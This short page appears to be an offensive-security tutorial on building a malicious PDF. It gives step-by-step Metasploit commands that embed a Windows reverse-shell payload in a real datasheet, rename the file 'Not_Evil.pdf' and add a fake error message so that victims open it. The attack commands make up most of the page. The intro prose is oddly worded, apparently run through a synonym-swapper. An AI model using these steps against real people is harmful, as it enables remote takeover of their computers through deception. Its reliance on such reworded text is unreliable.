---
title: Evil PDF
category: Client Side Attacks
order: 1
---

An Evil PDF is a pdf with malware inside.

# Introduction

PDF, or Portable Document Format, is an extraordinarily intricate file format, represented by numerous models and semi-principles. Like HTML and CSS, it was intended for document layout and introduction. Additionally, like HTML and CSS, it has been expanded with a JavaScript motor and document API that enables developers to transform PDF reports into applications — or agents for malware.

Among the most generally utilized Adobe items is Reader. Almost every PC has some variant of Adobe Reader on it for perusing PDFs. You presumably have it, as well. However, most people are ignorant of the security issues that Reader has encountered — and they neglect to upgrade or fix it.

# Creating the Evil PDF file

I will use `meterpreter` to compromise the client and get a reverse shell.

```
msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
```

We need to set some variables:

```
set FILENAME Not_Evil.pdf
set INFILENAME /root/Downloads/ESP8266_datasheet.pdf
set LAUNCH_MESSAGE Couldn't open PDF: Something's keeping this PDF from opening

set LPORT <port>
set LHOST <ip>
set PAYLOAD windows/shell_reverse_tcp

run
```

Finally a PDF is created with malware. A reverse shell will be prompted once the victim execute the file with an outdated Adobe Reader.

# References

* [https://medium.com/purple-team/embedding-backdoor-into-pdf-files-1781dfce62b1](https://medium.com/purple-team/embedding-backdoor-into-pdf-files-1781dfce62b1)
